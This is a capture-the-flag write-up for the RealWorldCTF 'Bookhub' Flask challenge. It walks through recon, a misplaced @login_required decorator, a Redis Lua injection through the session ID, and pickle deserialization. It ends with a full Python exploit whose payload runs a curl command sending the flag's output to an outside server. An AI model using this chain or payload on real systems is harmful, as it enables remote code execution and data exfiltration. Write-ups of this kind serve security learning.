# Bookhub	

Bookhub was a freakishly awesome challenge by the RealWorldCTF team.  This was the description:

```
How to pwn bookhub?  
  
[http://52.52.4.252:8080/](http://52.52.4.252:8080/)  
  
hint: www.zip
```

When I started the challenge, there was no hint. But running a quick dirserach, I found the /login/ endpoint and www.zip.

```$ dirsearch "http://52.52.4.252:8080/"

 _|. _ _  _  _  _ _|_    v0.3.8
(_||| _) (/_(_|| (_| )

Extensions: php, asp, aspx, jsp, py, xml, cgi | Threads: 10 | Wordlist size: 8220

Error Log: /home/jazzy/tools/dirsearch/logs/errors-18-07-29_22-56-54.log

Target: http://52.52.4.252:8080/

[22:56:54] Starting: 
[22:56:55] 400 -  173B  - /%2e%2e/google.com
[22:57:00] 403 -  571B  - /admin
....
[22:57:58] 200 -  612B  - /index.html
[22:58:00] 301 -  267B  - /login  ->  http://52.52.4.252:8080/login/
[22:58:00] 200 -    1KB - /login/
[22:58:13] 200 -   18KB - /www.zip

Task Completed
```
As you would suspect, www.zip contained the source code of all the web app. Fortunately for me, it was written in Flask and I'm quite familiar with Flask.

The login happens in `bookhub/forms.user.py`
```python
class LoginForm(FlaskForm):
    username = StringField('username', validators=[DataRequired()])
    password = PasswordField('password', validators=[DataRequired()])
    remember_me = BooleanField('remember_me', default=False)

    def validate_password(self, field):
        address = get_remote_addr()
        whitelist = os.environ.get('WHITELIST_IPADDRESS', '127.0.0.1')

        # If you are in the debug mode or from office network (developer)
        if not app.debug and not ip_address_in(address, whitelist):
            raise StopValidation(f'your ip address isn\'t in the {whitelist}.')

        user = User.query.filter_by(username=self.username.data).first()
        if not user or not user.check_password(field.data):
            raise StopValidation('Username or password error.')
  ```
  
  The server first checks if our IP address is one of the whitelisted IP addresses (or is the debug mode enabled) and if it is, it logs us in. The function `get_remote_addr()` is defined in `bookhub/helper.py`
```python
def get_remote_addr():
    address = flask.request.headers.get('X-Forwarded-For', flask.request.remote_addr)

    try:
        ipaddress.ip_address(address)
    except ValueError:
        return None
    else:
        return address
  ```
LOL, it so it returns our real IP or the IP from the header `X-Forwarded-For`  if it's available.

But unfortunately, adding the header changed nothing. It still showed that we are not allowed to log in because we are not in the whitelist.

![lol](https://i.imgur.com/m5FrKiR.png)

According to the server, the whitelist was 10.0.0.0/8,127.0.0.0/8,172.16.0.0/12,192.168.0.0/16,18.213.16.123 and 127.0.0.1 is not in that range. This doesn't sound right....

My hypothesis was that this is probably a reverse proxy which is stripping the X-Forwarded-For header. All the IP ranges in the whitelist were local IPs except one, which stuck out like a sore thumb. It was the following IP : 18.213.16.123 

With nothing to go on, I began my normal recon process with a nmap scan on the IP

```
$ sudo nmap -A -O -Pn 18.213.16.123 
[sudo] password for jazzy: 

Starting Nmap 7.01 ( https://nmap.org ) at 2018-07-29 23:22 PDT
Nmap scan report for ec2-18-213-16-123.compute-1.amazonaws.com (18.213.16.123)
Host is up (0.056s latency).
Not shown: 995 closed ports
PORT      STATE    SERVICE VERSION
22/tcp    open     ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 56:5e:e6:61:1d:d8:e4:ab:24:fa:00:da:eb:ec:7c:ad (RSA)
|_  256 63:d4:e2:fc:41:59:90:83:b3:37:8a:4c:04:b9:93:96 (ECDSA)
25/tcp    filtered smtp
113/tcp   filtered ident
5000/tcp  open     http    nginx 1.15.2
|_http-server-header: nginx/1.15.2
|_http-title: pwnhub_6672
10010/tcp open     rxapi?
.....
Device type: general purpose|phone|storage-misc|WAP
Running (JUST GUESSING): Linux 3.X|2.6.X|4.X|2.4.X (95%), Google Android 5.X (93%), HP embedded (90%)
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:2.6 cpe:/o:google:android:5.0.2 cpe:/o:linux:linux_kernel:4 cpe:/h:hp:p2000_g3 cpe:/o:linux:linux_kernel:2.6.22 cpe:/o:linux:linux_kernel:2.4
Aggressive OS guesses: Linux 3.10 - 3.19 (95%), Linux 3.2 - 3.8 (95%), Linux 2.6.26 - 2.6.35 (93%), Linux 2.6.32 - 3.13 (93%), Android 5.0.2 (93%), Linux 3.2 - 3.10 (93%), Linux 3.2 - 3.13 (93%), Linux 3.2 - 4.0 (93%), Linux 2.6.23 - 2.6.38 (92%), Linux 3.10 (92%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 445/tcp)
HOP RTT     ADDRESS
1   2.78 ms ec2-18-213-16-123.compute-1.amazonaws.com (18.213.16.123)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 334.85 seconds
```
So port 5000 is open which also runs pwnhub and there's also a weird service on port 10010. Opening http://18.213.16.123:5000/, I'm greeted with a lovely message;

![lol](https://i.imgur.com/HG03eh3.png)

Oh, this is convienient. The webapp is run in debug mode. Let's take a look at the source to see what does the debug mode expose as "security issues". In the file `bookhub/views/user.py`, we identify the following additional code for debug mode

```python
if app.debug:
    """
    For CTF administrator, only running in debug mode
    """

    @user_blueprint.route('/admin/system/')
    @login_required
    def system():
...

    @user_blueprint.route('/admin/system/change_name/', methods=['POST'])
    @login_required
    def change_name():
...

    @login_required
    @user_blueprint.route('/admin/system/refresh_session/', methods=['POST'])
    def refresh_session():
....

        return flask.jsonify(dict(status=status))
```

This is where I got stuck for hours. All of the endpoints are supposedly protected by @login_required identifier and we don't have a admin session, so we can't access any of them. 

But if we take a closer look (like real close), we can identify a subtle but dangerous bug:

```python
    @login_required
    @user_blueprint.route('/admin/system/refresh_session/', methods=['POST'])
    def refresh_session():
        """
        delete all session except the logined user

        :return: json
        """
        ...
```

The @login_required identifier is above the @user_blueprint_route whereas it should be below. This means we can access the "/admin/system/refresh_session/" endpoint without authentication. (This is so real world)

Down below in the same function, we can identify some really sketchy code:

```python
        sessionid = flask.session.sid
        prefix = app.config['SESSION_KEY_PREFIX']

        if flask.request.form.get('submit', None) == '1':
            try:
                rds.eval(rf'''
                local function has_value (tab, val)
                    for index, value in ipairs(tab) do
                        if value == val then
                            return true
                        end
                    end
                
                    return false
                end
                
                local inputs = {{ "{prefix}{sessionid}" }}
                local sessions = redis.call("keys", "{prefix}*")
                
                for index, sid in ipairs(sessions) do
                    if not has_value(inputs, sid) then
                        redis.call("del", sid)
                    end
                end
                ''', 0)
 ```
 
 There is a redis.eval() call with our sessionID in it. It's supposed to delete all the admin sessions except ours and it does through redis.eval() which accepts a lua script and the redis functions in it can be called through redis.call(). (The server actually uses redis to store session related data)

Since we can control our sessionID on client side, we basically have a redis injection. Since I have no experience with lua or redis, I cloned the server environment as I would probably need it to write my exploit. 

As I was setting up the redis server and making sure it works properly, I stumbled upon this:
```
$ redis-cli
127.0.0.1:6379> GET "bookhub:session:0c14aa8d-f405-4166-841a-04422ad2d6f6"
"\x80\x03}q\x00(X\n\x00\x00\x00_permanentq\x01\x88X\x06\x00\x00\x00_freshq\x02\x89X\n\x00\x00\x00csrf_tokenq\x03X(\x00\x00\x00a9bcf95844a0bfa0a217cd95b23a174472d780d8q\x04u."
```
This looks like a pickle serialized python object. You can easily identify a serialized pickle with the `\x80\x03` at the start. This points to your typical pickle deserialization vuln. The server stores our session as data as a serialized object and if we can control it, we can make it deserialize a malicious pickle object which runs our code.

I wrote a quick script which changed my sessionID to valid lua, refreshed my CSRF token and then sent a POST request to "/admin/system/refresh_session/" endpoint (to store the code). 

My final payload was to do a `redis.call("SET", "bookhub:session:hacker", {pickle RCE code serialized})` and then send a GET request to "/login/" to make sure our serialized object is deserialized.

Here is my final script which sends the flag to my server (I used lua's string.char() function to send non readable bytes because URL encoding was fucking me over)

```python
import requests
from bs4 import BeautifulSoup
import pickle
import os
import sys
import base64

#rwctf{fl45k_1s_a_MAg1cal_fr4mew0rk_t0000000000}

COMMAND = '/usr/bin/curl -X POST "http://199.247.28.91/hacked" -d "$(/readflag|base64)"'

class PickleRce(object): #credits to https://gist.github.com/mgeeky/cbc7017986b2ec3e247aab0b01a9edcd
    def __reduce__(self):
        return (os.system,(COMMAND,))

hax = pickle.dumps(PickleRce())

ans = "string.char("
for char in hax:
	ans += "{},".format(ord(char))

ans = ans[:-1] + ")"

cmd = 'hacker"}} redis.call("SET", "bookhub:session:hacker", {hack})--'.format(hack=ans)
LOCAL = True

if LOCAL:
	CSRF = BeautifulSoup(requests.get("http://127.0.0.1:5000/login/", cookies={'bookhub-session':cmd}).text, 'lxml').find('input', {'name':'csrf_token'}).get('value')
	print requests.post("http://127.0.0.1:5000/admin/system/refresh_session/", cookies={'bookhub-session':cmd}, data={'submit':'1', 'csrf_token':CSRF}).text
	requests.get("http://127.0.0.1:5000/login/", cookies={'bookhub-session':'hacker'})
else:
	CSRF = BeautifulSoup(requests.get("http://18.213.16.123:5000/login/", cookies={'bookhub-session':cmd}).text, 'lxml').find('input', {'name':'csrf_token'}).get('value')
	print requests.post("http://18.213.16.123:5000/admin/system/refresh_session/", cookies={'bookhub-session':cmd}, data={'submit':'1', 'csrf_token':CSRF}).text
	requests.get("http://18.213.16.123:5000/login/", cookies={'bookhub-session':'hacker'})
	```
